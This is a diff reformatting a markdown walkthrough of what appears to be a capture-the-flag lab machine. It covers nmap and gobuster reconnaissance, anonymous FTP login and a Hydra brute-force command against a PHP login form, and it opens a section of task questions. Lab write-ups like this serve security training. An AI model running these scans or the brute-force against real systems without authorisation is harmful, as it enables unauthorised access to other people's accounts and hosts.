@@ -17,54 +17,71 @@ tags:
 ---
 
 ![](/img2/Pasted%20image%2020250310120957.png)
+
 ## Introduction
 
 > In this machine, we are taking advantage of FTP anonymous login and exploiting the login anel with Hydra.
 
 ## Reconnaissance
 
-1. Connectivity
+- Connectivity
+
 ```bash
 ping -c1 10.129.1.15
 ```
 
-2. Nmap
+- Nmap
+
 ```bash
 nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.1.15
 ```
+
 ![](/img2/Pasted%20image%2020250310122012.png)
 
-3. Vulnerability scanning with nmap
+- Vulnerability scanning with nmap
+
 ```bash
 nmap -sV -sC -p21,80 10.129.1.15
 ```
+
 ![](/img2/Pasted%20image%2020250310122217.png)
 
-4. Fuzzing with gobuster
+- Fuzzing with gobuster
+
 ```bash
 gobuster dir -u http://10.129.1.15/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash -t 100
 ```
+
 ![](/img2/Pasted%20image%2020250310123251.png)
+
 ## Exploitation
 
-1. Login FTP with anonymous user
+- Login FTP with anonymous user
+
 ```bash
 ftp 10.129.1.15
 ```
+
 ![](/img2/Pasted%20image%2020250310122549.png)
+
 > Password --> anonymous
 
-2. Brute forcing login pannel with hydra
+- Brute forcing login pannel with hydra
 
 - Check the pannel login request 
+
 ![](/img2/Pasted%20image%2020250310123726.png)
+
 ![](/img2/Pasted%20image%2020250310123820.png)
 
 - Run attack with hydra
+
 ```bash
 hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.1.15 http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:F=Warning\!"
 ```
+
 ![](/img2/Pasted%20image%2020250310125148.png)
+
 ## Tasks
 
 1. What Nmap scanning switch employs the use of default scripts during a scan?
